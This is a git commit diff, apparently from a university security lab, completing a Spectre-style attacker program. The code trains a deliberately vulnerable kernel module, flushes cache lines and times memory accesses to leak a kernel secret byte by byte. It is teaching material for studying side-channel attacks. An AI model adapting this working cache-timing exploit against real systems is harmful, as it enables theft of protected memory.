d10a84510fc5d5471714a5e7609d71863e1abda6
Jiayan Dong <jid001@ucsd.edu>
2022-10-28 22:27:49 -0700

    part2 finished

--- LAB2/part2-src/attacker-part2.c
+++ LAB2/part2-src/attacker-part2.c
@@ -21,7 +21,8 @@
  *  - shared_memory: Memory region to share with the kernel
  *  - offset: The offset into the secret to try and read
  */
-static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
+static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset)
+{
     lab2_command local_cmd;
     local_cmd.kind = COMMAND_PART2;
     local_cmd.arg1 = (uint64_t)shared_memory;
@@ -37,20 +38,52 @@ static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t 
  *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
  *  - shared_memory: A pointer to a region of memory shared with the server
  */
-int run_attacker(int kernel_fd, char *shared_memory) {
+int run_attacker(int kernel_fd, char *shared_memory)
+{
     char leaked_str[LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
 
     printf("Launching attacker\n");
 
-    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
+    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++)
+    {
         char leaked_byte;
 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
+        int leaked_byte_freq[LAB2_SHARED_MEMORY_NUM_PAGES] = {0};
+        int most_freq_cnt = -1;
+
+        for (size_t outer_i = 0; outer_i < 100; outer_i++)
+        {
+            for (size_t i = 0; i < 10; i++)
+            {
+                call_kernel_part2(kernel_fd, shared_memory, 0);
+            }
+            for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
+            {
+                clflush((void *)(shared_memory + i * LAB2_PAGE_SIZE));
+            }
+            call_kernel_part2(kernel_fd, shared_memory, current_offset);
+            for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
+            {
+                uint64_t t = time_access((void *)(shared_memory + i * LAB2_PAGE_SIZE));
+                if (t < 150)
+                {
+                    leaked_byte_freq[i]++;
+                    if (leaked_byte_freq[i] > most_freq_cnt)
+                    {
+                        // printf("%lu %lu\n", i, t);
+                        most_freq_cnt = leaked_byte_freq[i];
+                        leaked_byte = i;
+                    }
+                }
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
-        if (leaked_byte == '\x00') {
+        if (leaked_byte == '\x00')
+        {
             break;
         }
     }
